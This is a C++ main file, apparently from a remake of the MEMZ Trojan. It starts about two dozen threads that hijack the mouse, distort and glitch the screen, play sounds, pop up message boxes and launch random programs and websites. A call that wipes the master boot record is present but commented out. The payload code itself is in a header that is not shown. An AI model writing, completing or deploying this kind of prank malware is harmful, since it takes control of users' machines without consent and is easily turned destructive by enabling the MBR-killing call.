#include "MEMZ.h" // Process Main

using namespace std;

int main()
{
    // Initialize //
    disable_redraw(); // Disable Redraw
    StartWarning(); // Warning
    CreateNote(); // Create Note
    AllowANSIControlChar(); // Allow ANSI Control Characters
    Sleep(800); // Wait 0.8 Secounds(Anti Crash)...

    // Main Process Zone //
    //KILLMBR(); // KILL MASTER RECORD
    thread a(infclick); // Random Click
    thread b(infInvColor); // Invert Screen Color
    thread c(infIcon); // Random Draw Icons
    thread d(infCursor); // Random Move Mouse
    thread e(infChange); // Invert String
    thread f(inftunnel); // Draw Tunnel Effect
    thread g(randomDraw); // Random Draw Lines
    thread h(infplay); // Play System Error Sounds
    thread i(infBlink); // Screen Blink
    thread j(InvertColor_slow); // Invert Screen Color (Slow) Like "Nepotonod"
    thread k(ScreenMelter); // Screen Melter Like "Nepotonod"
    thread l(infShock); // Window Shocker
    thread m(randomExecute); // Random Execute Some Programs/Websites
    thread n(iconAura); // Draw Icons Around The Mouse
    thread o(midiMusic); // Play Midi Music
    thread p(payloadMessageBox); // Pop Message Boxs
    thread q(infglitch); // Glitch Screen
    thread r(drawNyancat); // Draw Nyancat
    thread s(rand_beep); // Random Beep
    thread t(sayNyan); // Your computer was not trashed by the MEMZ Trojan. Now you can't enjoy the Nyan Cat~
    thread u(OrientationsScreen); // Random Orientations Screens
    thread v(InstallKeyboardHook); // Exit Program When Enter/Exit Pressed
    thread w(InfRandWrite); // Random Write Text To Screen
    thread x(ScreenSplitting); // Screen Splitting
    thread y(RandomColor); // Random Show Color Line
    thread z(GlitchLine); // Screen Glitch (Line Mode)
    getchar(); // Pause Program
    return 0; // Normal Exit
}
